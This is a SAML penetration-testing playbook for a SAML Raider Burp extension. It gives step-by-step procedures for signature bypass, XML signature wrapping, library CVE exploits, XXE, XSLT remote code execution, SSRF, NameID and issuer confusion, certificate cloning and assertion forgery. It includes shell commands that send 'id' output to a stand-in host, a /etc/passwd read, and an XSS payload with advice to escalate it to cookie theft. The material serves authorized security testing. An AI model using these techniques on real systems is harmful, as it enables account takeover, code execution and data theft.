# SAML Penetration Testing — Operator Playbook

Engagement-phase playbook. Each module is a numbered procedure with explicit SAML Raider steps.
Reference [ATTACKS.md](ATTACKS.md) for per-button details.

---

## Phase 0 — Setup

1. Build: `./gradlew build` → load `build/libs/SAMLRaider-*-all.jar` in Burp (**Extensions → Add → Java**).
2. Proxy a complete SSO flow. When the extension detects `SAMLRequest` / `SAMLResponse`, a **SAML Raider** tab appears in the request/response editor.
3. On first capture: **Store Certificate** → seeds the Certificates tab with the IdP public cert. Do this before any other attack.
4. Optionally, open the **SAML Raider Certificates** tab at the top level and **Clone Certificate** on the stored IdP cert. That clone (same DN, attacker key) is used for re-signing throughout.

---

## Phase 1 — Reconnaissance

**Goal:** understand the SSO topology and collect artifacts before touching the wire.

### 1.1 Read the intercepted message
In the SAML Raider tab, the **Message Info** panel shows:
- Issuer, Destination, Recipient (ACS URL)
- Signature algorithm and what's signed (Response vs Assertion)
- Whether assertion is encrypted (`<EncryptedAssertion>`)
- NotBefore / NotOnOrAfter / IssueInstant / SessionNotOnOrAfter
- NameID and Format
- AudienceRestriction values
- StatusCode

Note all of these before touching anything.

### 1.2 Fetch IdP / SP metadata
1. In the SAML Raider tab, click **Import Metadata**.
2. Enter the base URL of the SSO endpoint (e.g. `https://sso.target.com/sso`).
3. Click **Discover All** — probes 21 common SAML metadata paths and streams results into the table.
4. Select a green **✓ Valid metadata** row → click **Import Metadata**.
5. Switch to **SAML Raider Certificates** — imported signing certs appear there.

If the metadata URL is known, use **Check URL** instead of Discover All.

**What to note:**
- SP Entity ID (target of audience restriction)
- ACS endpoint(s) registered in metadata — if the IdP enforces strict ACS matching, ACS spoofing won't work
- Signing vs. Encryption KeyDescriptors — tells you which cert to use for re-signing vs. encrypting assertions
- `<md:NameIDFormat>` elements — tells you which NameID format the SP expects

### 1.3 Map the SP stack
Check HTTP response headers, error pages, and framework cookies to guess:
- **.NET / WIF / ADFS** → Dupe Key Confusion is viable (Module 9)
- **Ruby / Devise + ruby-saml** → check version; CVE-2024-45409 if < 1.17.0
- **Go + crewjam/saml** → CVE-2022-41912 if unpatched
- **Java + Apache Santuario** → XSLT RCE (CVE-2022-47966), KeyInfo SSRF, SigRef SSRF
- **Python / python3-saml / python-saml** → check for recent XXE and XSW patches

---

## Phase 2 — Signature Validation Testing

**Goal:** determine whether the SP validates signatures at all before burning effort on XSW.

This is the highest-ROI test. Do it in under five minutes before anything else.

### 2.1 Corrupt Digest (fastest oracle)
1. Capture a signed SAMLResponse in Proxy. Do not forward.
2. SAML Raider tab → **Manipulate** row → **Corrupt Digest**.
3. Forward.
4. **Oracle:** session granted = digest never checked. SP treats the assertion as valid regardless of signature integrity. Report as critical; stop — no need to go further on sig validation.
5. **Oracle:** 403 / error = SP at least checks digest. Continue.

### 2.2 Remove all signatures
1. Reset: **Reset Message** (restores original).
2. **Signing** row → **Remove Signatures**.
3. Forward.
4. **Oracle:** session granted = SP skips validation entirely when no sig is present. Also report as critical.
5. **Oracle:** error = SP requires a signature element. Continue.

### 2.3 HMAC algorithm confusion
1. **Signing** row → **HMAC Confusion** (no cert needed — uses the embedded `<ds:X509Certificate>` bytes as HMAC key).
2. Forward.
3. **Oracle:** session granted = SP does not enforce signature algorithm allowlist (CVE-2019-1006 class). Report.
4. **Oracle:** error = SP enforces alg pinning.

If any of 2.1–2.3 succeed, log it and pivot to identity manipulation (Module 7) to escalate to account takeover.

---

## Phase 3 — XSW (XML Signature Wrapping)

**Goal:** make the SP verify a legitimate signature while consuming an attacker-controlled assertion.

Precondition: the response is signed (signature is present). If Remove Signatures (§2.2) already gave you a session, skip this module.

### 3.1 XSW blind scan
1. Start with **XSW3** (highest hit rate across most SP stacks).
2. **Attacks** tab → **XSW** row → pick variant from dropdown → click **Apply XSW**.
3. Before forwarding, click **Preview in Browser…** to confirm the evil assertion differs from the signed node.
4. Forward.
5. **Oracle:** login as attacker identity = XSW bypass confirmed.
6. If blocked, try variants in order: **XSW1, XSW2, XSW4, XSW5, XSW6, XSW7, XSW8**.

XSW7 hides the evil copy inside `<Extensions>`; XSW8 inside `<Object>` — both are effective against older OneLogin and SimpleSAMLphp stacks.

### 3.2 Customize the evil assertion
1. Before clicking Apply XSW, use **Match and Replace** to set the NameID in the evil assertion to your target user's email.
2. Apply XSW → Forward.
3. **Oracle:** session as target user = account takeover. Report as critical.

---

## Phase 4 — Library-Specific CVE Payloads

Run after XSW, or if you've identified the SP library in recon.

### 4.1 CVE-2024-45409 (ruby-saml < 1.17.0)
**Prepends** an unsigned evil Assertion before the signed one. ruby-saml's XPath returns the first match.
1. **Attacks** tab → CVE dropdown → **CVE-2024-45409** → **Apply CVE** → Forward.
2. **Oracle:** session under attacker identity in the prepended assertion.

### 4.2 CVE-2022-41912 (crewjam/saml, Go)
**Appends** an unsigned evil Assertion after the signed one. Library validates first, processes last.
1. **Attacks** tab → CVE dropdown → **CVE-2022-41912** → **Apply CVE** → Forward.
2. **Oracle:** session under identity in appended assertion.

### 4.3 CVE-2025-23369 (GitHub Enterprise / libxml2)
Exploits libxml2's entity-ID redefinition to make the `#id` reference resolve to attacker DOM.
1. **Attacks** tab → CVE dropdown → **CVE-2025-23369** → **Apply CVE** → Forward.
2. **Oracle:** signature validates against one node; SP consumes a different, attacker-inserted node.

### 4.4 CVE-2025-25291 / CVE-2025-25292 (ruby-saml parser differential)
DOCTYPE- and namespace-based parser differentials — Nokogiri vs. REXML see different DOMs.
1. **Attacks** tab → CVE dropdown → select variant → **Apply CVE** → Forward.
2. **Oracle:** session under identity visible in attacker's namespace view but not the verifier's.

**Quick reference:** click **?** next to the CVE dropdown for affected library versions and CVSSv3.

---

## Phase 5 — XML Parser Attacks (XXE, XSLT)

These fire **before** signature validation on many SPs — try them even if signing is enforced.

### 5.1 XXE (external entity injection)
**Target:** any SAML response. Useful against older .NET / Java XML parsers.
1. **SSRF/RCE** tab → click **Test XXE**.
2. **Burp Pro:** check **Use Burp Collaborator** (auto-populated).
   **Community:** uncheck it → enter your OOB listener domain.
3. Click OK. The payload is prepended to the SAML XML.
4. Forward.
5. **Oracle:** inbound Collaborator / OOB hit = XML parser resolves external entities → probe for file read or internal SSRF.
6. Escalate: customize the XXE to read `/etc/passwd` or `C:\Windows\win.ini` — paste the result as file URI and see if the SP exfiltrates it.

### 5.2 XSLT injection (all 3 flavors)
**Target:** any signed response with `<ds:Transforms>` in the Reference (virtually all signed SAML).

#### Blind SSRF via Saxon `unparsed-text` (XSLT 2.0)
1. **SSRF/RCE** tab → **Test XSLT** → pick **Saxon unparsed-text**.
2. Enter Collaborator URL in the **Collaborator/OOB URL** field → OK.
3. Forward.
4. **Oracle:** inbound Collaborator hit confirms XSLT 2.0 engine present. The request path may reveal the file being fetched.

#### Java RCE via Xalan `Runtime.exec` (CVE-2022-47966 / ManageEngine)
1. **Test XSLT** → pick **Xalan Runtime.exec**.
2. Field label changes to **Shell command:** → enter `curl https://collab.example/rce`.
3. OK → Forward.
4. **Oracle:** inbound hit = RCE. Response body may contain `java.lang.UNIXProcess@...` as further confirmation.
5. Escalate to: `bash -c 'curl https://collab.example/$(id|base64)'`

#### Xalan DocumentHandler class instantiation (CVE-2014-0107)
1. **Test XSLT** → pick **Xalan DocumentHandler**.
2. Enter OOB URL → OK → Forward.
3. **Oracle:** hit = arbitrary class instantiation on the Java classpath.

---

## Phase 6 — SSRF Attacks

### 6.1 x509 / KeyInfo SSRF
**Target:** signed response. SP fetches keys from URIs in `<ds:KeyInfo>` during validation.
1. **SSRF/RCE** tab → **KeyInfo SSRF**.
2. Enter Collaborator URL → OK.
3. The `<X509Data>` is replaced with `<ds:RetrievalMethod URI="https://collab"/>`.
4. Forward.
5. **Oracle:** inbound hit = SP fetches external keys during sig processing → can escalate by serving an attacker-controlled cert at that URL to override trust.

### 6.2 SigRef SSRF (three modes)

#### REFERENCE_URI
SP fetches an external URL to obtain the canonicalized data for digest computation.
1. **SSRF/RCE** tab → **SigRef SSRF** dropdown → **REFERENCE_URI**.
2. Click button → Collaborator URL → OK → Forward.
3. **Oracle:** inbound hit = direct SSRF. Try `file:///etc/passwd` for local file read.

#### XPATH_DOCUMENT
Injects `document('https://collab')` inside an XPath transform.
1. Dropdown → **XPATH_DOCUMENT** → same steps.
2. **Oracle:** hit = XPath SSRF. Combine with serving a malicious XML to chain class instantiation.

#### BASE64_XXE (.NET CVE-2022-34716)
1. Dropdown → **BASE64_XXE** → same steps.
2. **Oracle:** hit = .NET XML signature processes a base64-decoded XXE document through a permissive parser.

### 6.3 Encryption SSRF (pre-auth, for EncryptedAssertion targets)

SPs decrypt before verifying signatures — these land pre-auth even on properly signing SPs.

1. Intercept the SAMLResponse in **Proxy**. Do not forward.
2. **SSRF/RCE** tab → **Enc SSRF** mode dropdown.

#### CipherReference (highest hit rate)
3. Select **CipherReference** → click **Enc SSRF** → Collaborator URL → OK.
4. Forward.
5. **Oracle:** inbound Collaborator hit during auth = pre-auth SSRF confirmed.

#### EncryptedKey KeyInfo (second attempt)
6. **Reset Message** → pick **EncryptedKey KeyInfo** → same steps.
7. **Oracle:** SP fetches the wrapping key from attacker URL during key unwrap.

#### DataReference
8. **Reset Message** → pick **DataReference** → same steps.
9. **Oracle:** SP dereferences DataReference list during decryption.

Always **Reset Message** between modes — SPs reject replayed assertions.

---

## Phase 7 — Assertion Manipulation

### 7.1 Replay — Extend validity window
Use this to replay a captured assertion after its natural `NotOnOrAfter` has elapsed.
1. **Assertion** tab → **Extend Validity +24h**.
2. Adjusts `NotBefore` to now−1h, `NotOnOrAfter` / `SessionNotOnOrAfter` to now+24h.
3. Signature is now stale — either:
   - Forward as-is to test if SP enforces timestamps AND signature together.
   - Or re-sign (Module 9) first if SP requires a valid sig.
4. **Oracle:** session granted with an expired assertion = timestamp not enforced.

### 7.2 Replay — Refresh timestamps on a crafted assertion
Use this when you've hand-edited the assertion XML and need fresh timestamps without re-typing them.
1. **Assertion** tab → **Refresh Timestamps**.
2. Sets `IssueInstant` / `AuthnInstant` to now, `NotBefore` to now−1h, `NotOnOrAfter` / `SessionNotOnOrAfter` to now+1h.
3. **Oracle:** tests whether the SP enforces timestamp window — also a prerequisite before forwarding any crafted assertion.

### 7.3 Status code bypass
Some SPs process assertions regardless of the top-level `<StatusCode>`.
1. **Assertion** tab → **Status → Success**.
2. Replaces every StatusCode Value with `urn:oasis:names:tc:SAML:2.0:status:Success`.
3. Forward.
4. **Oracle:** SP starts a session even when no valid assertion was present in the original (error) response.

### 7.4 Audience restriction bypass
1. **Assertion** tab → **Remove Audience**.
2. Removes all `<AudienceRestriction>` elements.
3. Forward.
4. **Oracle:** SP accepts an assertion not scoped to its entity ID — enables cross-SP / cross-tenant assertion replay.
   Combine with Extend Validity for cross-tenant replay of an expired assertion.

---

## Phase 8 — Identity Manipulation

### 8.1 NameID comment injection (Duo CVE-2017-11427/28/29/30)
Exclusive C14N strips comments before digest computation → signature stays valid, SP gets truncated NameID.
1. **Attacks** tab → **Inject** row → **Comment Injection** dropdown → pick position.
   - **Before @** → `admin<!---->@victim.com` — naive text extraction returns `admin`.
   - **After @** → `admin@<!---->victim.com` — returns `admin@`.
   - **Prepend** → `<!---->admin@victim.com` — may return empty.
2. **Inject Comment** → Forward.
3. **Oracle:** login lands on `admin`'s account rather than `admin@victim.com`.

### 8.2 NameID PI injection (processing instruction variant)
Same goal; some parsers strip PIs differently from comments — catches different stacks.
1. **Inject PI** dropdown → pick position → **Inject PI** → Forward.
2. **Oracle:** same as comment injection.

### 8.3 Issuer confusion (multi-tenant SPs)
SP maps Issuer string to an IdP record by exact equality — invisible characters break that lookup.
1. **Attacks** tab → **Confuse Issuer** → pick mode:
   - **Trailing Space** (ASCII 0x20) — most common miss.
   - **Trailing NBSP** (U+00A0)
   - **Trailing ZWSP** (U+200B)
   - **Homoglyph** (Cyrillic 'а' for Latin 'a')
2. **Confuse Issuer** → Forward.
3. **Oracle:** SP accepts the response as coming from a different tenant's IdP — attacker-controlled IdP at a lookalike Issuer can now issue arbitrary assertions accepted by the target SP.

### 8.4 XSS in SAML error pages
SP renders SAML fields into error messages without HTML-escaping before signature check runs.
1. **Attacks** tab → **Inject XSS** → pick target field (Destination, Issuer, NameID, Audience).
2. Default payload: `"><script>alert(1)</script>`. Customize if needed.
3. OK → Forward.
4. **Oracle:** XSS fires in the SP's error page (e.g., `The assertion Destination "..." is invalid`).
   Escalate with a payload that exfiltrates cookies or session tokens.

---

## Phase 9 — Certificate Trust Testing

**Goal:** determine whether the SP pins the exact key material or just matches by DN/Subject string.
A match-by-subject SP can be fooled into trusting assertions signed by an attacker key as long as the cert Subject matches the original IdP cert.

### 9.1 Clone the IdP cert and re-sign
1. **Store Certificate** on a captured signed response (seeds Certificates tab with IdP cert).
2. **SAML Raider Certificates** tab → select the stored cert → **Clone Certificate**.
   - Generates a new cert with the same Subject DN and issuer string but a fresh attacker-controlled RSA keypair.
3. Back in the **SAML Raider** tab, open the **Certificate** dropdown → select the cloned cert.
4. Apply any assertion mutation (change NameID, Extend Validity, Remove Audience, etc.).
5. **Signing** row → **(Re-)Sign Assertion** or **(Re-)Sign Message** (whichever the SP validates).
6. Forward.
7. **Oracle:** session granted = SP matches by Subject DN, not by pinned public key. Report as high — attacker with any cert sharing the IdP's DN can sign valid assertions.

### 9.2 Clone a cert chain (multi-cert IdPs)
If the IdP uses an intermediate CA:
1. **Clone Chain** on the stored cert — creates matching certs for each cert in the chain.
2. Select the end-entity clone in the Certificate dropdown.
3. Proceed as in 9.1.

### 9.3 Dupe Key Confusion (.NET WIF / ADFS — Black Hat 2019)
`ResolveSecurityKey` picks by key type (first match), `ResolveSecurityToken` picks by cert type — they see different KeyInfo elements.

**Prereq:** capture a signed response and **Store Certificate** first. The extension remembers the original X509 bytes automatically.

1. **SAML Raider Certificates** tab → create or use an attacker cert **with a private key** (use **Create Certificate** if needed).
2. Select it in the **Certificate** dropdown.
3. **Attacks** tab → **Signing** row → **Dupe Key Confusion**.
   - Re-signs the assertion with the attacker key.
   - Rewrites KeyInfo: prepends attacker's `<ds:RSAKeyValue>`, leaves the original `<ds:X509Certificate>` in place.
4. Forward.
5. **Oracle:** session granted as the identity in the assertion, with a signature that verified under an attacker key.

---

## Phase 10 — Encrypted Assertion Attacks

### 10.1 Forge an EncryptedAssertion (impersonation via re-encryption)

Use when you've obtained the SP's encryption certificate (from metadata or **Store Certificate**) and want to inject a forged plaintext identity.

**Workflow A — SP already sends EncryptedAssertion:**
1. **Assertion** tab → select **KeyInfo Style** from dropdown:
   - **X509IssuerSerial** (default, matches most real IdP output)
   - **Full X509Certificate** (verbose; use if IssuerSerial produces parse errors at the SP)
2. Click **Encrypt Assertion**.
   - If a plaintext `<Assertion>` exists in the current XML: encrypts it in place using the SP cert in the Certificate dropdown.
   - If only an `<EncryptedAssertion>` exists (no plaintext): opens the **Build & Encrypt** dialog.
     - **Issuer**, **NameID Format**, **Recipient**, **Audience** are pre-filled from response metadata.
     - Enter the **NameID** (target user's email or username).
     - Click **Build & Encrypt**.
   - The extension re-encrypts using algorithms matched to what the original EncryptedAssertion used (AES-256-CBC + RSA-OAEP by default).
3. Forward.
4. **Oracle:** SP decrypts, processes the forged identity, and grants a session = full account takeover.

**Workflow B — Build from scratch (no existing EncryptedAssertion):**
1. Edit the raw XML in the SAML Raider text area — remove any existing assertion content.
2. **Encrypt Assertion** → **Build & Encrypt** dialog appears.
3. Fill in NameID and adjust other fields as needed → **Build & Encrypt**.
4. Re-sign if the SP requires a valid outer signature (see §9.1).
5. Forward.

**Note on IssuerName format:** the extension captures the verbatim `X509IssuerName` from the original `<EncryptedKey>` at load time. When you re-encrypt, that exact DN string is reused in the new KeyInfo — matching the format the target IdP produced, rather than Java's RFC 2253 serialization. This avoids parse errors caused by DN format mismatches.

---

## Phase 11 — ACS / Redirect Attacks

### 11.1 ACS URL spoofing (SAMLRequest intercept)
**Target:** the outbound `SAMLRequest` sent from SP to IdP.
**Prereq:** IdP does not strictly enforce ACS URL against its registered metadata.
1. Intercept the SP → IdP redirect in Proxy. Do not forward.
2. SAML Raider tab → **Request** row → **Spoof ACS URL**.
3. Enter your listener URL (Burp Collaborator, netcat, Burp Intruder handler).
4. Forward.
5. Victim authenticates normally; IdP posts the signed SAMLResponse to your URL.
6. Replay that response against the real SP ACS endpoint using a fresh Burp Repeater tab.
7. **Oracle:** session granted using a victim's valid signed assertion captured out-of-band.

### 11.2 Recipient / Destination confusion
SP may not check whether the `Recipient` attribute on `<SubjectConfirmationData>` or `Destination` on `<Response>` matches the current request's ACS URL.
1. In the SAML Raider text editor, change `Recipient` and `Destination` to a different ACS URL (e.g., another SP in the same federation).
2. **Refresh Timestamps** to keep the message fresh.
3. Forward to the original SP's ACS.
4. **Oracle:** session granted = SP doesn't validate Recipient/Destination → assertion intended for SP-B was accepted by SP-A (cross-SP replay).

---

## Decision Tree — What to Try First

```
SAML response captured
│
├─ Assertion plaintext or encrypted?
│   ├─ Encrypted → try Enc SSRF first (Phase 6.3) — pre-auth
│   └─ Plaintext → continue
│
├─ Signed?
│   ├─ No → Remove Audience, Status→Success, Extend Validity, change NameID → Forward
│   └─ Yes → Phase 2 (sig validation tests) in order:
│       1. Corrupt Digest → session? STOP (report critical)
│       2. Remove Signatures → session? STOP (report critical)
│       3. HMAC Confusion → session? Report (alg not pinned)
│       4. Phase 3 (XSW1–8)
│       5. Phase 4 (library CVEs)
│
├─ SP stack identified?
│   ├─ .NET/ADFS → Dupe Key Confusion (Phase 9.3)
│   ├─ Java SP → XSLT RCE (Phase 5.2), KeyInfo SSRF (Phase 6.1)
│   ├─ ruby-saml < 1.17 → CVE-2024-45409 (Phase 4.1)
│   └─ Go crewjam → CVE-2022-41912 (Phase 4.2)
│
├─ Multi-tenant SP?
│   └─ Confuse Issuer (Phase 8.3) → cross-tenant bypass
│
├─ NameID is email format?
│   └─ Comment Injection before @ (Phase 8.1) → admin account takeover
│
└─ Have SP encryption cert?
    └─ Build & Encrypt flow (Phase 10.1) → forge assertion for any identity
```

---

## Quick-Reference: Common Attack Chains

### 5-minute sig-never-validated triage
1. **Corrupt Digest** → forward — session = done
2. **Remove Signatures** → forward — session = done
3. **HMAC Confusion** → forward — session = alg not pinned

### Account takeover via XSW + NameID swap
1. **Match and Replace**: `admin@target.com` (target NameID)
2. **XSW3** → **Apply XSW** → Forward
3. Walk XSW1,2,4–8 if blocked

### Cross-tenant takeover (multi-tenant SP)
1. **Confuse Issuer → Trailing Space** → Forward
2. If blocked → try Homoglyph or NBSP variants

### NameID admin truncation
1. **Comment Injection → Before @** → Forward
2. Blocked → **PI Injection → Before @**

### Pre-auth RCE on Java SP (ManageEngine / Santuario)
1. **Test XSLT → Xalan Runtime.exec**
2. Command: `curl https://collab.example/$(id|base64 -w0)`
3. Forward → Collaborator hit = RCE

### Pre-auth SSRF via EncryptedAssertion
1. Fresh captured response → **Enc SSRF → CipherReference** → Forward
2. No hit → **Reset Message** → **EncryptedKey KeyInfo** → Forward
3. No hit → **Reset Message** → **DataReference** → Forward

### Re-signing after assertion mutation
1. **Store Certificate** (captures IdP cert)
2. Certificates tab → **Clone Certificate**
3. Select clone in **Certificate** dropdown
4. Apply mutation (XSW / Extend Validity / NameID change)
5. **(Re-)Sign Assertion** or **(Re-)Sign Message**
6. Forward

### Forge & encrypt arbitrary assertion
1. Cert dropdown → SP encryption cert (from metadata or Store Certificate)
2. **Assertion** tab → **KeyInfo Style** → **X509IssuerSerial**
3. **Encrypt Assertion** → Build & Encrypt dialog → fill NameID → **Build & Encrypt**
4. Re-sign outer Response if required
5. Forward

---

## Reference

- [SAML Security Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [Bypassing SAML — Duo Security (Comment Injection)](https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations)
- [Dupe Key Confusion — Aura/Black Hat 2019](https://github.com/aurainfosec/signature_wrapping)
- [HMAC Confusion — CVE-2019-1006](https://mattermost.com/blog/cve-2019-1006-saml-signature-bypass/)
- [XSW reference taxonomy — Shibboleth wiki](https://wiki.shibboleth.net/confluence/display/SC/XML+Signature+Wrapping+Vulnerability)
- [XSLT injection (CVE-2022-47966) — Horizon3](https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/)
- [ruby-saml CVE-2024-45409 — GitHub Advisory](https://github.com/advisories/GHSA-jw9c-mfg7-9rx2)
- [libxml2 / GitHub Enterprise CVE-2025-23369](https://github.com/advisories/GHSA-h35p-c5cr-7v9r)
- [SAMLRaider ATTACKS.md](ATTACKS.md) — per-button reference for this fork
